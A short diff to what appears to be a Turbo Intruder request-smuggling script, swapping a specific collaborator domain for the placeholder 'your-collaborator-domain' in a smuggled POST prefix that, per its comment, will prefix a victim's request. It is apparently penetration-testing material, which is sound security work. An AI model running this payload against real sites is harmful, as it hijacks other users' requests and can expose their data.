@@ -13,7 +13,7 @@ def queueRequests(target, wordlists):
 
     # This will prefix the victim's request. Edit it to achieve the desired effect.
     prefix = '''POST /hopefully404 HTTP/1.1
-Host: 0uv5p05xabvwcz8ukuc73ikco3uuij.psres.net
+Host: your-collaborator-domain
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 15
 
